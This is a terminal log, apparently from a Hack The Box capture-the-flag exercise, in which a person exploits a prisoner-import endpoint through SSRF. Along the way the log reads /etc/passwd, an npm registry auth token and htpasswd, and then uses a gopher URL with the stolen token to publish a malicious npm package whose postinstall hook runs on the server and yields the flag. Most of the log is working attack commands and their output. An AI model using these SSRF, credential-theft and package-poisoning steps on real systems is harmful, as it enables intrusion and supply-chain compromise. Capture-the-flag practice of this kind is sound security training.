@@ -1,0 +1,336 @@
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> curl -s http://94.237.61.249:43680/
+
+cmdlet Invoke-WebRequest at command pipeline position 1
+Supply values for the following parameters:
+Uri: http://94.237.61.249:43680/
+curl : Cannot find drive. A drive with the name 'http' does not exist.
+At line:1 char:1
++ curl -s http://94.237.61.249:43680/
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (http:String) [Invoke-WebRequest], Dri 
+   veNotFoundException
+    + FullyQualifiedErrorId : DriveNotFound,Microsoft.PowerShell.Commands.InvokeWebR 
+   equestCommand
+ 
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s http://94.237.61.249:43680/api/prisoners
+[{"id":"PIP-472839","raw":"prisoner_profile:\n  name: Jonathan \"Johnny\" Archer\n  age: 45\n  height: \"6'1\"\n  complexity: High\n  marks_tattoos:\n    - \"Tattoo of architectural blueprints on left forearm\"\n    - \"Scar above right eyebrow\"\n  eye_color: Blue\n  hair_color: Brown\n  origin: New Chicago\n  headshot: \"https://example.com/headshots/jonathan_archer.jpg\"\n  occupation: Architect\n  crime: \"Sabotage of mutant stronghold construction\"\n  sentence: \"Indefinite imprisonment\"\n  penitentiary_name: Prison-Pipeline\n  prisoner_zone: Alpha-4\n  prisoner_cell: A4-11\n  penalties:\n    - \"Forced labor in hazardous conditions\"\n    - \"Solitary confinement for insubordination\"\n  behavior_record:\n    incidents: 5\n    last_incident: \"Attempted sabotage of prison defenses - 2024-04-10\"\n    remarks: \"Highly intelligent and resourceful, poses significant escape risk\"\n  health_status:\n    physical: \"Malnourished, multiple untreated injuries\"\n    mental: \"Showing signs of severe stress and psychological trauma\"","name":"Jonathan \"Johnny\" Archer","age":45,"height":"6'1","complexity":"High","marks_tattoos":["Tattoo of architectural blueprints on left forearm","Scar above right eyebrow"],"eye_color":"Blue","hair_color":"Brown","origin":"New Chicago","headshot":"https://example.com/headshots/jonathan_archer.jpg","occupation":"Architect","crime":"Sabotage of mutant stronghold construction","sentence":"Indefinite imprisonment","penitentiary_name":"Prison-Pipeline","prisoner_zone":"Alpha-4","prisoner_cell":"A4-11","penalties":["Forced labor in hazardous conditions","Solitary confinement for insubordination"],"behavior_record":{"incidents":5,"last_incident":"Attempted sabotage of prison defenses - 2024-04-10","remarks":"Highly intelligent and resourceful, poses significant escape risk"},"health_status":{"physical":"Malnourished, multiple untreated injuries","mental":"Showing signs of severe stress and psychological trauma"}},{"id":"PIP-839201","raw":"prisoner_profile:\n  name: Sarah \"Boomer\" Thompson\n  age: 38\n  height: \"5'7\"\n  complexity: Medium\n  marks_tattoos:\n    - \"Explosive symbol tattoo on right bicep\"\n    - \"Burn scars on left hand\"\n  eye_color: Green\n  hair_color: Black\n  origin: Dusthaven\n  headshot: \"https://example.com/headshots/sarah_thompson.jpg\"\n  occupation: Demolition Specialist\n  crime: \"Destruction of mutant supply convoy\"\n  sentence: \"15 years with hard labor\"\n  penitentiary_name: Prison-Pipeline\n  prisoner_zone: Beta-2\n  prisoner_cell: B2-08\n  penalties:\n    - \"Extended solitary confinement for possession of contraband\"\n    - \"Manual excavation in dangerous areas\"\n  behavior_record:\n    incidents: 7\n    last_incident: \"Unauthorized construction of improvised explosives - 2024-02-28\"\n    remarks: \"Highly skilled in explosives, considered a high-risk prisoner\"\n  health_status:\n    physical: \"Fit but with untreated injuries\"\n    mental: \"Defiant and rebellious attitude\"","name":"Sarah \"Boomer\" Thompson","age":38,"height":"5'7","complexity":"Medium","marks_tattoos":["Explosive symbol tattoo on right bicep","Burn scars on left hand"],"eye_color":"Green","hair_color":"Black","origin":"Dusthaven","headshot":"https://example.com/headshots/sarah_thompson.jpg","occupation":"Demolition Specialist","crime":"Destruction of mutant supply convoy","sentence":"15 years with hard labor","penitentiary_name":"Prison-Pipeline","prisoner_zone":"Beta-2","prisoner_cell":"B2-08","penalties":["Extended solitary confinement for possession of contraband","Manual excavation in dangerous areas"],"behavior_record":{"incidents":7,"last_incident":"Unauthorized construction of improvised explosives - 2024-02-28","remarks":"Highly skilled in explosives, considered a high-risk prisoner"},"health_status":{"physical":"Fit but with untreated injuries","mental":"Defiant and rebellious attitude"}},{"id":"PIP-654321","raw":"prisoner_profile:\n  name: Marcus \"Ironclad\" Steele\n  age: 52\n  height: \"6'3\"\n  complexity: High\n  marks_tattoos:\n    - \"Military insignia tattoo on right shoulder\"\n    - \"Multiple battle scars on torso\"\n  eye_color: Brown\n  hair_color: Gray\n  origin: Fort Freedom\n  headshot: \"https://example.com/headshots/marcus_steele.jpg\"\n  occupation: Army General\n  crime: \"Leading a human rebellion against mutant overlords\"\n  sentence: \"Life imprisonment without parole\"\n  penitentiary_name: Prison-Pipeline\n  prisoner_zone: Omega-1\n  prisoner_cell: O1-01\n  penalties:\n    - \"Permanent solitary confinement\"\n    - \"Restricted communication privileges\"\n  behavior_record:\n    incidents: 12\n    last_incident: \"Orchestrating an attempted prison-wide revolt - 2024-01-15\"\n    remarks: \"Exceptional strategic mind, poses a significant threat to mutant control\"\n  health_status:\n    physical: \"Strong but with untreated chronic injuries\"\n    mental: \"Resilient but exhibiting signs of psychological wear\"","name":"Marcus \"Ironclad\" Steele","age":52,"height":"6'3","complexity":"High","marks_tattoos":["Military insignia tattoo on right shoulder","Multiple battle scars on torso"],"eye_color":"Brown","hair_color":"Gray","origin":"Fort Freedom","headshot":"https://example.com/headshots/marcus_steele.jpg","occupation":"Army General","crime":"Leading a human rebellion against mutant overlords","sentence":"Life imprisonment without parole","penitentiary_name":"Prison-Pipeline","prisoner_zone":"Omega-1","prisoner_cell":"O1-01","penalties":["Permanent solitary confinement","Restricted communication privileges"],"behavior_record":{"incidents":12,"last_incident":"Orchestrating an attempted prison-wide revolt - 2024-01-15","remarks":"Exceptional strategic mind, poses a significant threat to mutant control"},"health_status":{"physical":"Strong but with untreated chronic injuries","mental":"Resilient but exhibiting signs of psychological wear"}},{"id":"PIP-987654","raw":"prisoner_profile:\n  name: Dr. Emily \"Doc\" Caldwell\n  age: 41\n  height: \"5'9\"\n  complexity: Medium\n  marks_tattoos:\n    - \"Caduceus symbol tattoo on left wrist\"\n    - \"Surgical scar on abdomen\"\n  eye_color: Hazel\n  hair_color: Blonde\n  origin: Sanctuary City\n  headshot: \"https://example.com/headshots/emily_caldwell.jpg\"\n  occupation: Medical Specialist\n  crime: \"Providing medical aid to human insurgents\"\n  sentence: \"20 years with possibility of parole in 5 years\"\n  penitentiary_name: Prison-Pipeline\n  prisoner_zone: Delta-3\n  prisoner_cell: D3-07\n  penalties:\n    - \"Revoked medical practice privileges\"\n    - \"Forced labor in the prison infirmary under supervision\"\n  behavior_record:\n    incidents: 3\n    last_incident: \"Smuggling medical supplies to other prisoners - 2024-03-12\"\n    remarks: \"Compassionate but willing to break rules to help others\"\n  health_status:\n    physical: \"Generally healthy but undernourished\"\n    mental: \"Stable but showing signs of depression\"","name":"Dr. Emily \"Doc\" Caldwell","age":41,"height":"5'9","complexity":"Medium","marks_tattoos":["Caduceus symbol tattoo on left wrist","Surgical scar on abdomen"],"eye_color":"Hazel","hair_color":"Blonde","origin":"Sanctuary City","headshot":"https://example.com/headshots/emily_caldwell.jpg","occupation":"Medical Specialist","crime":"Providing medical aid to human insurgents","sentence":"20 years with possibility of parole in 5 years","penitentiary_name":"Prison-Pipeline","prisoner_zone":"Delta-3","prisoner_cell":"D3-07","penalties":["Revoked medical practice privileges","Forced labor in the prison infirmary under supervision"],"behavior_record":{"incidents":3,"last_incident":"Smuggling medical supplies to other prisoners - 2024-03-12","remarks":"Compassionate but willing to break rules to help others"},"health_status":{"physical":"Generally healthy but undernourished","mental":"Stable but showing signs of depression"}}]
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"http://localhost:4873/"}'
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"http://localhost:4873/prisoner-db"}'
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"http://localhost:4873/-/all"}'
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"https://httpbin.org/robots.txt"}'
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"https://raw.githubusercontent.com/test/test/main/test.txt"}'
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"file:///etc/passwd"}'
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -v -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:4873"}'
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 94.237.61.249:43680...
+* Connected to 94.237.61.249 (94.237.61.249) port 43680
+> POST /api/prisoners/import HTTP/1.1
+> Host: 94.237.61.249:43680
+> User-Agent: curl/8.5.0
+> Accept: */*
+> Content-Type: application/json
+> Content-Length: 27
+>
+< HTTP/1.1 500 Internal Server Error
+< Server: nginx
+< Date: Mon, 05 Jan 2026 20:14:30 GMT
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 39
+< Connection: keep-alive
+< X-Powered-By: Express
+<
+* Connection #0 to host 94.237.61.249 left intact
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"http://webhook.site/test"}'
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"gopher://localhost:4873/_test"}'
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s http://94.237.61.249:43680/api/prisoners | wsl python3 -c "import json,sys; d=json.load(sys.stdin); print([x['id'] for x in d])"
+['PIP-472839', 'PIP-839201', 'PIP-654321', 'PIP-987654']
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import -H "Content-Type: application/json" -d '{"url":"http://localhost:5000/api/prisoners/PIP-472839"}'
+{"message":"500 internal server error"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl python3 -c "print('test')"
+/bin/bash: -c: line 1: syntax error near unexpected token `('
+/bin/bash: -c: line 1: `python3 -c print('test')'
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl "python3 -c 'print(1)'"
+/bin/bash: line 1: python3 -c 'print(1)': command not found
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl python3 --version
+Python 3.12.3
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "curl -s http://94.237.61.249:43680/api/prisoners | head -c 200"
+[{"id":"PIP-472839","raw":"prisoner_profile:\n  name: Jonathan \"Johnny\" Archer\n  age: 45\n  height: \"6'1\"\n  complexity: High\n  marks_tattoos:\n    - \"Tattoo of architectural blueprints on left
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/MISC/misc_prison_pipeline && python3 exploit.py"
+[*] Prison Pipeline Exploit
+[*] Testing SSRF vectors...
+[*] Testing file:///etc/passwd: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-460581"}
+[*] Testing file:///app/package.json: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-205254"}
+[*] Testing file:///home/node/.config/verdaccio/htpasswd: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-572842"}
+[*] Testing http://127.0.0.1:4873/: 200 - {"message":"Prisoner data imported successfully","prisoner_id":false}
+[*] Testing http://localhost:4873/: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-731332"}
+
+[*] Current prisoners:
+  - PIP-472839: Jonathan "Johnny" Archer
+  - PIP-839201: Sarah "Boomer" Thompson
+  - PIP-654321: Marcus "Ironclad" Steele
+  - PIP-987654: Dr. Emily "Doc" Caldwell
+  - PIP-460581: Unknown
+  - PIP-205254: Unknown
+  - PIP-572842: Unknown
+  - PIP-731332: Unknown
+
+[*] Checking for flag at /static/flag.txt...
+
+[*] Malicious package body:
+{"_id": "prisoner-db", "name": "prisoner-db", "description": "Database interface for prisoners of Prison-Pipeline.", "dist-tags": {"latest": "1.0.1"}, "versions": {"1.0.1": {"name": "prisoner-db", "version": "1.0.1", "description": "Database interface for prisoners of Prison-Pipeline.", "main": "index.js", "scripts": {"postinstall": "/readflag > /app/static/flag.txt"}, "dist": {"integrity": "sha512-KZwjlaEkU1GDmv1pzduL/QcHbNevAfmqOWF4fGZJmaM7CD3gjEFeMtC6B1909xp4r/ySyyNaRnMQpZpcWnE52g==", "shasum...
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "curl -s 'http://94.237.61.249:43680/api/prisoners/PIP-572842'"
+{"id":"PIP-572842","raw":"registry:vXehhNUoMMrxM:autocreated 2024-05-19T02:54:21.220Z\n"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "curl -s 'http://94.237.61.249:43680/api/prisoners/PIP-460581'"
+{"id":"PIP-460581","raw":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nnode:x:1000:1000::/home/node:/bin/bash\n"}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "curl -s -X POST 'http://94.237.61.249:43680/api/prisoners/import' -H 'Content-Type: application/json' -d '{\"url\":\"gopher://localhost:4873/_GET%20/%20HTTP/1.1%0d%0aHost:%20localhost:4873%0d%0a%0d%0a\"}'" | head -c 500
+head : The term 'head' is not recognized as the name of a cmdlet, function, script    
+file, or operable program. Check the spelling of the name, or if a path was
+included, verify that the path is correct and try again.
+At line:1 char:222
++ ... 20HTTP/1.1%0d%0aHost:%20localhost:4873%0d%0a%0d%0a\"}'" | head -c 500
++                                                               ~~~~
+    + CategoryInfo          : ObjectNotFound: (head:String) [], CommandNotFoundExcep  
+   tion
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl -- bash -c "curl -s -X POST 'http://94.237.61.249:43680/api/prisoners/import' -H 'Content-Type: application/json' -d '{\"url\":\"gopher://localhost:4873/_test\"}'"
+/bin/bash: -c: line 1: unexpected EOF while looking for matching `"'
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/MISC/misc_prison_pipeline && python3 exploit.py 2>&1"
+[*] Prison Pipeline Exploit
+[*] Testing SSRF vectors...
+[*] Testing file:///etc/passwd: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-277307"}
+[*] Testing file:///app/package.json: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-541550"}
+[*] Testing file:///home/node/.config/verdaccio/htpasswd: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-104413"}
+[*] Testing file:///home/node/.npmrc: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-651363"}
+[*] Testing file:///app/node_modules/prisoner-db/package.json: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-156777"}
+[*] Testing http://127.0.0.1:4873/: 200 - {"message":"Prisoner data imported successfully","prisoner_id":false}
+[*] Testing http://localhost:4873/: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-560833"}
+[*] Testing gopher://localhost:4873/_test: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-116822"}
+[*] Testing dict://localhost:4873/: 502 - <html>
+<head><title>502 Bad Gateway</title></head>
+<body>
+<center><h1>502 Bad Gateway</h1></cente
+
+[*] Current prisoners:
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/requests/models.py", line 971, in json
+    return complexjson.loads(self.text, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/mnt/c/Users/sadik/Documents/HTB-CTF/MISC/misc_prison_pipeline/exploit.py", line 179, in <module>
+    main()
+  File "/mnt/c/Users/sadik/Documents/HTB-CTF/MISC/misc_prison_pipeline/exploit.py", line 168, in main
+    prisoners = r.json()
+                ^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/models.py", line 975, in json
+    raise RequestsJSONDecodeError(e.msg, e.doc, e.pos)
+requests.exceptions.JSONDecodeError: Expecting value: line 1 column 1 (char 0)        
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "curl -s 'http://94.237.61.249:43680/api/prisoners/PIP-651363'"
+<html>
+<head><title>502 Bad Gateway</title></head>
+<body>
+<center><h1>502 Bad Gateway</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "sleep 5 && curl -s 'http://94.237.61.249:43680/api/prisoners' | head -c 100"
+[{"id":"PIP-472839","raw":"prisoner_profile:\n  name: Jonathan \"Johnny\" Archer\n  age: 45\n  heigh
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "curl -s -X POST 'http://94.237.61.249:43680/api/prisoners/import' -H 'Content-Type: application/json' -d '{\"url\":\"file:///home/node/.npmrc\"}'"
+/bin/bash: -c: line 1: unexpected EOF while looking for matching `"'
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/MISC/misc_prison_pipeline && python3 read_files.py"     
+[*] Prison Pipeline Exploit
+
+[*] Reading /home/node/.npmrc...
+Content:
+//localhost:4873/:_authToken="MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQzYzg3OWZiN2YwY2EyZGI5ZmMwMGI4ZWViZWVhZmUzZjc0Y2I2MWFiOTZmNWI1OWVhNTg0N2IwZmIwZQ=="
+
+
+[*] Reading /home/node/.config/verdaccio/htpasswd...
+Content:
+registry:vXehhNUoMMrxM:autocreated 2024-05-19T02:54:21.220Z
+
+
+[*] Reading /app/node_modules/prisoner-db/package.json...
+Content:
+{
+  "name": "prisoner-db",
+  "version": "1.0.0",
+  "description": "Database interface for prisoners of Prison-Pipeline.",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo 1337"
+  },
+  "keywords": [
+    "prison-pipeline",
+    "prisoner-db"
+  ],
+  "author": "hackthebox",
+  "license": "ISC",
+  "dependencies": {
+    "js-yaml": "^4.1.0",
+    "node-libcurl": "4.0.0"
+  }
+}
+
+
+[*] Reading /home/node/.config/verdaccio/storage/prisoner-db/package.json...
+Content:
+{
+        "name": "prisoner-db",
+        "versions": {
+                "0.0.1": {
+                        "name": "prisoner-db",
+                        "version": "0.0.1",
+                        "description": "Database interface for prisoners of Prison-Pipeline.",
+                        "main": "index.js",
+                        "scripts": {
+                                "test": "echo 1337"
+                        },
+                        "keywords": [
+                                "prison-pipeline",
+                                "htb",
+                                "rayhan0x01"
+                        ],
+                        "author": {
+                                "name": "rayhan0x01"
+                        },
+                        "license": "ISC",
+                        "_id": "prisoner-db@0.0.1",
+                        "_nodeVersion": "21.7.3",
+                        "_npmVersion": "8.1.0",
+                        "dist": {
+                                "integrity": "sha512-rVvu00q6p7Lwtef6w70Ev95aFRNDvvX4psT1ohsQy195Dy+0Sg8TykGZqUHkt/h2seDjBENPsqXJ54vGIHTPLw==",
+                                "shasum": "03281085bfea245f3a23688a2f6add735a34d558", 
+                                "tarball": "https://registry.npmjs.org/prisoner-db/-/prisoner-db-0.0.1.tgz",
+                                "fileCount": 3,
+                                "unpackedSize": 4996,
+                                "signatures": [
+                                        {
+                                                "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+                                                "sig": "MEQCID4Nl9WEZ2uo3GwpwxVki5LKvFfLA6f5WUsz8ne8eigzAiA7FxIQhaCC9N6PnMkuHh8FrmlBsLpnlKMiOpHyCByXZA=="
+                                        }
+                                ]
+                        },
+                        "_npmUser": {
+                                "name": "prisondb",
+                                "email": "rayhan0x01+prison@gmail.com"
+                        },
+                        "directories": {},
+                        "maintainers": [
+                                {
+                                        "name": "prisondb",
+                                        "email": "rayhan0x01+prison@gmail.com"        
+                                }
+                        ],
+                        "_npmOperationalInternal": {
+                                "host": "s3://npm-registry-packages",
+                                "tmp": "tmp/prisoner-db_0.0.1_1716077419902_0.5409369215196962"
+                        },
+                        "_hasShrinkwrap": false,
+                        "contributors": []
+                },
+                "1.0.0": {
+                        "name": "prisoner-db",
+                        "version": "1.0.0",
+                        "description": "Database interface for prisoners of Prison-Pipeline.",
+                        "main": "index.js",
+                        "scripts": {
+                                "test": "echo 1337"
+                        },
+                        "keywords": [
+                                "prison-pipeline",
+                                "prisoner-db"
+                        ],
+                        "author": {
+                                "name": "hackthebox"
+                        },
+                        "license": "ISC",
+                        "dependencies": {
+                                "js-yaml": "^4.1.0",
+                                "node-libcurl": "4.0.0"
+                        },
+                        "_id": "prisoner-db@1.0.0",
+                        "readmeFilename": "README.md",
+                        "_nodeVersion": "21.7.3",
+                        "_npmVersion": "10.5.0",
+                        "dist": {
+                                "integrity": "sha512-bvMX7SeDG9pfKmuCyETrEL9f8VmJCKJb+8iY3b4113qQb5Y1vEWVaX6mUk/JFY6s5ig4L7RRYnJjYtC87Pf5hQ==",
+                                "shasum": "b4c0ef8ac4108339a53b49931c1586c14f457697", 
+                                "tarball": "http://localhost:4873/prisoner-db/-/prisoner-db-1.0.0.tgz"
+                        },
+                        "contributors": []
+                }
+        },
+        "time": {
+                "created": "2024-05-19T00:10:19.808Z",
+                "0.0.1": "2024-05-19T00:10:20.109Z",
+                "modified": "2024-05-19T02:54:24.811Z",
+                "1.0.0": "2024-05-19T02:54:24.811Z"
+        },
+        "users": {},
+        "dist-tags": {
+                "latest": "1.0.0"
+        },
+        "_uplinks": {
+                "npmjs": {
+                        "etag": "W/\"be519fb1ffe9f4c2f4d204cc93d27cac\"",
+                        "fetched": 1716087264797
+                }
+        },
+        "_distfiles": {
+                "prisoner-db-0.0.1.tgz": {
+                        "url": "https://registry.npmjs.org/prisoner-db/-/prisoner-db-0.0.1.tgz",
+                        "sha": "03281085bfea245f3a23688a2f6add735a34d558",
+                        "registry": "npmjs"
+                }
+        },
+        "_attachments": {
+                "prisoner-db-1.0.0.tgz": {
+                        "shasum": "b4c0ef8ac4108339a53b49931c1586c14f457697",
+                        "version": "1.0.0"
+                }
+        },
+        "_rev": "4-2cf1531ca518da0b",
+        "_id": "prisoner-db",
+        "readme": "# Prisoner DB\n\nDatabase interface for prisoners of Prison-Pipeline.\n"
+}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/MISC/misc_prison_pipeline && python3 exploit_full.py"   
+[*] Prison Pipeline Exploit - Supply Chain Attack
+[*] Creating malicious package...
+[*] Gopher URL length: 3216
+[*] First 200 chars of payload: gopher://localhost:4873/_PUT%20%2Fprisoner-db%20HTTP%2F1.1%0D%0AHost%3A%20localhost%3A4873%0D%0AAuthorization%3A%20Bearer%20MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQz...
+
+[*] Sending SSRF request to publish malicious package...
+[*] Response: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-585472"}
+
+[*] Waiting for cronjob to install malicious package (up to 60 seconds)...
+[*] Checking for flag... (5s)
+[*] Checking for flag... (10s)
+[*] Checking for flag... (15s)
+[*] Checking for flag... (20s)
+[*] Checking for flag... (25s)
+
+[+] FLAG FOUND at /static/flag.txt:
+HTB{pr1s0n_br34k_w1th_supply_ch41n!_39f2976ce32e6f43823a69d477d10a01}
+PS C:\Users\sadik\Documents\HTB-CTF\MISC\misc_prison_pipeline> 
